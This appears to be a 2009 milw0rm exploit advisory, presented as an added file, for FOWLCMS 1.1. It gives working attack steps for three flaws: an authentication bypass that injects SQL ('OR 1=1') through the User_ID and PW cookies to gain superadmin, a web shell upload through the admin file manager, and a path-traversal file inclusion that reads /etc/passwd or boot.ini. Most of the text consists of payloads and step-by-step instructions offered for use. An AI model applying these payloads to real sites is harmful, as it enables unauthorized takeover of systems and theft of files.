@@ -1,0 +1,160 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| 	  FOWLCMS 1.1          |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: https://sourceforge.net/projects/fowlcms/				             |
+|-->DOWNLOAD: https://sourceforge.net/projects/fowlcms/ 	   		             |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: FOWL is not only a generic term for birds breeded as farm animals,	     |
+|		but also a CMS (Content Management System)...Use for: Blog Private homepage. |
+|-->RELEASED: 2009-04-15								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: N/A										     |
+|-->CATEGORY: AUTH-BYPASS(INSECURE-COOKIE|SQLi)/SHELL-UPLOAD/LFI			     |
+|-->AFFECT VERSION: 1.1						     			     |
+|-->Discovered Bug date: 2009-04-22							     |
+|-->Reported Bug date: 2009-04-22							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+///////////////////////////////////////////////////////
+
+AUTHENTICATION BYPASS (INSECURE COOKIE HANDLING/SQLi):
+
+//////////////////////////////////////////////////////
+
+-----
+POC:
+-----
+
+Add cookies:
+
+User_ID= xXx' [SQL] /*
+PW=xXx
+
+Or...
+
+User_ID=xXx
+PW=xXx' [SQL] /*
+
+Both are injectable.
+
+---------
+EXPLOIT:
+---------
+
+User_ID= xXx' OR 1=1 /*
+PW=xXx
+
+OR...
+
+User_ID=xXx
+PW=xXx' OR 1=1 /*
+
+Superadmin account!
+
+**************************************************************************
+When we are superadmin, we can exploit other attacks...(follow reading).
+**************************************************************************
+
+////////////////////////////
+
+SHELL UPLOAD VULNERABILITY:
+
+///////////////////////////
+
+
+http://[HOST]/[HOME_PATH]/index.php?site=admin&action=files
+
+Here we upload our shell. (Use a reliable path, ex: test)
+
+Then, if you go to the link:
+
+http://[HOST]/[HOME_PATH]/[PATH-SHELL]/shell.php
+
+
+////////////////////////////
+
+LOCAL FILE INCLUSION (LFI):
+
+///////////////////////////
+
+-----
+PoC:
+-----
+
+Sites are stored in DB, but the administration panel allows to change sites (del/modify) (below link)
+
+http://[HOST]/[HOME_PATH]/index.php?site=admin&action=sites
+
+There, we change:
+
+../../../../../boot.ini --> column: Dateiname
+
+Something (signup for ex.) --> column: Alias
+
+Or...
+
+../../../../etc/passwd  --> column: Dateiname
+
+Something (signup for ex.)  --> column: Alias
+
+Then, we go to:
+
+http://[HOST]/[HOME_PATH]/index.php?site=[Alias]
+
+We can see the boot.ini or passwd files.
+
+---------
+EXPLOIT:
+---------
+	
+changing the "signup" alias for the file that you want.
+
+http://[HOST]/[HOME_PATH]/index.php?site=signup
+
+Boom!
+
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+-------------------------------------------------------------------
+*******************************************************************
+ GREETZ TO: JosS and all spanish Hack3Rs community!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-23]
